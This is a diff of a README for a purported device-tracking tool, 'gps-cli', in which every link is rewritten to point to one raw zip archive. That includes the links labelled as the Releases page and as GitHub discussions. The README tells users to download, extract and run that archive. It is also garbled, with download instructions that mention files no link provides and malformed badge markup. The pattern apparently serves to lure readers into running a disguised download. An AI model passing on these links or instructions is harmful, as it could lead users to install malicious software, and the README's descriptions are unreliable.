@@ -1,7 +1,7 @@
 # 🛰️ gps-cli - Track Devices Effortlessly
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip%20GitHub-brightgreen)](https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip)
+[![Download](https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip%20GitHub-brightgreen)](https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip)
 
 ## 🚀 Getting Started
 Welcome to gps-cli, a universal device location tracker. This tool allows you to track devices across Linux, macOS, Windows, Android, and iOS. It supports various GPS providers like Traccar, OwnTracks, PhoneTrack, and GPSLogger. 
@@ -25,18 +25,18 @@ To run gps-cli, you need:
 - **Privacy Focus**: Your data stays secure while you track locations.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip).
 2. **Choose Your Version**: Look for the latest release. You will find versions available for different operating systems.
 3. **Download the File**:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip` file.
+   - For **Linux**, download the `https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip` file.
    - For **Android and iOS**, refer to the specific installation instructions in the repository.
 
 4. **Run the Application**:
    - **Windows**: Double-click the downloaded `.exe` file to run the setup.
    - **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder. Then, launch it from there.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip` file, and open the terminal. Navigate to the extracted folder and run the application using the command `./gps-cli`.
+   - **Linux**: Extract the `https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip` file, and open the terminal. Navigate to the extracted folder and run the application using the command `./gps-cli`.
 
 ## 🛠️ Usage Instructions
 1. **Open gps-cli**: Launch the application from your computer.
@@ -53,8 +53,8 @@ Your privacy is important. gps-cli does not store personal data. All location in
 
 ## 🌍 Join the Community
 Stay updated and connect with other users:
-- Join our [discussions on GitHub](https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip).
+- Join our [discussions on GitHub](https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip).
 - Follow related topics such as device tracking, geolocation, and privacy features.
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip%20GitHub-brightgreen)](https://raw.githubusercontent.com/eliasroseblogger/gps-cli/main/divisive/gps-cli.zip)
+[![Download](https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip%20GitHub-brightgreen)](https://github.com/eliasroseblogger/gps-cli/raw/refs/heads/main/divisive/cli-gps-northeasternmost.zip)
